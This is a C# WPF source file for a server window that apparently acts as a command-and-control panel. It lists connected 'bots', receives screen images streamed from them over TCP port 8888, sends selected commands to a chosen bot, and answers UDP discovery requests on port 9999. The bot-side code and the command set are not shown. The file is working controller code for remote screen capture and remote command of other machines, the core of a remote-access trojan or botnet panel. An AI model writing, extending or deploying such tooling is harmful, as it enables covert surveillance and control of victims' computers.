using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Collections.ObjectModel;
using System.IO;

namespace ServerApp;

/// <summary>
/// Interaction logic for MainWindow.xaml
/// </summary>
public partial class MainWindow : Window
{
    private ObservableCollection<string> messages = new ObservableCollection<string>();
    private ObservableCollection<string> bots = new ObservableCollection<string>();
    private Dictionary<string, TcpClient> botClients = new Dictionary<string, TcpClient>();
    public MainWindow()
    {
        InitializeComponent();
        MessagesList.ItemsSource = messages;
        BotsList.ItemsSource = bots;
        SendCommandButton.Click += SendCommandButton_Click;
        StartTcpListener();
        StartUdpDiscoveryListener();
    }

    private void SendCommandButton_Click(object sender, RoutedEventArgs e)
    {
        if (BotsList.SelectedItem == null)
        {
            MessageBox.Show("Please select a bot.");
            return;
        }
        string botId = BotsList.SelectedItem.ToString();
        string command = (CommandComboBox.SelectedItem as ComboBoxItem)?.Content.ToString();
        if (string.IsNullOrWhiteSpace(command))
        {
            MessageBox.Show("Please select a command.");
            return;
        }
        if (botClients.TryGetValue(botId, out TcpClient client))
        {
            try
            {
                NetworkStream stream = client.GetStream();
                byte[] data = Encoding.UTF8.GetBytes(command);
                stream.Write(data, 0, data.Length);
                messages.Add($"Sent to {botId}: {command}");
            }
            catch (Exception ex)
            {
                messages.Add($"Error sending command: {ex.Message}");
            }
        }
        else
        {
            messages.Add($"Bot {botId} not connected.");
        }
    }

    private void DisplayScreenImage(byte[] imageData)
    {
        try
        {
            using (var ms = new MemoryStream(imageData))
            {
                var bitmap = new BitmapImage();
                bitmap.BeginInit();
                bitmap.CacheOption = BitmapCacheOption.OnLoad;
                bitmap.StreamSource = ms;
                bitmap.EndInit();
                ScreenImage.Source = bitmap;
            }
        }
        catch (Exception ex)
        {
            messages.Add($"Image decode error: {ex.Message}");
        }
    }

    private async void StartTcpListener()
    {
        await Task.Run(() =>
        {
            TcpListener server = null;
            try
            {
                int port = 8888;
                server = new TcpListener(IPAddress.Any, port);
                server.Start();
                while (true)
                {
                    TcpClient client = server.AcceptTcpClient();
                    NetworkStream stream = client.GetStream();
                    while (true)
                    {
                        // Read 4 bytes for image length
                        byte[] lengthBytes = new byte[4];
                        int read = stream.Read(lengthBytes, 0, 4);
                        if (read != 4) break;
                        int imageLength = BitConverter.ToInt32(lengthBytes, 0);
                        if (imageLength > 0 && imageLength < 10 * 1024 * 1024) // sanity check
                        {
                            byte[] imageData = new byte[imageLength];
                            int totalRead = 0;
                            while (totalRead < imageLength)
                            {
                                int chunk = stream.Read(imageData, totalRead, imageLength - totalRead);
                                if (chunk <= 0) break;
                                totalRead += chunk;
                            }
                            string botId = $"Bot_{client.Client.RemoteEndPoint}";
                            Dispatcher.Invoke(() =>
                            {
                                if (!bots.Contains(botId))
                                {
                                    bots.Add(botId);
                                    botClients[botId] = client;
                                }
                                DisplayScreenImage(imageData);
                                messages.Add($"Received screen from {botId}");
                            });
                        }
                        else
                        {
                            // Fallback to text message
                            byte[] buffer = new byte[1024];
                            int bytesRead = stream.Read(buffer, 0, buffer.Length);
                            if (bytesRead > 0)
                            {
                                string message = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                                string botId = $"Bot_{client.Client.RemoteEndPoint}";
                                Dispatcher.Invoke(() =>
                                {
                                    if (!bots.Contains(botId))
                                    {
                                        bots.Add(botId);
                                        botClients[botId] = client;
                                    }
                                    messages.Add($"Received from {botId}: {message}");
                                });
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Dispatcher.Invoke(() =>
                {
                    this.Title = $"Error: {ex.Message}";
                });
            }
            finally
            {
                server?.Stop();
            }
        });
    }

    private void StartUdpDiscoveryListener()
    {
        Task.Run(() =>
        {
            UdpClient udpServer = null;
            try
            {
                int discoveryPort = 9999;
                udpServer = new UdpClient(discoveryPort);
                IPEndPoint remoteEP = new IPEndPoint(IPAddress.Any, 0);
                while (true)
                {
                    byte[] data = udpServer.Receive(ref remoteEP);
                    string msg = Encoding.UTF8.GetString(data);
                    if (msg == "SERVER_DISCOVERY_REQUEST")
                    {
                        byte[] response = Encoding.UTF8.GetBytes("SERVER_DISCOVERY_RESPONSE");
                        udpServer.Send(response, response.Length, remoteEP);
                        Dispatcher.Invoke(() =>
                        {
                            messages.Add($"Discovery request from {remoteEP.Address}");
                        });
                    }
                }
            }
            catch (Exception ex)
            {
                Dispatcher.Invoke(() =>
                {
                    messages.Add($"UDP Discovery Error: {ex.Message}");
                });
            }
            finally
            {
                udpServer?.Close();
            }
        });
    }
}